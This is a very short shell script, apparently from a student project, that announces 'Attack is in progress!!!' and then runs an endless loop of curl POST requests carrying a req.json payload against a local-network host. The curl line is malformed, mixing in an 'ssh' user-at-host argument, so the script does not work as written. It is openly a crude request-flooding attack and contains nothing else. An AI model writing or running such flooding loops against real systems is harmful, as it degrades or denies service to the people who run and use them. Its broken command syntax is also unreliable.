echo "=========================================================="
echo "Attack is in progress!!!"
echo "=========================================================="

while :
do 
	curl -X POST -d @req.json ssh fyp@192.168.8.100
done
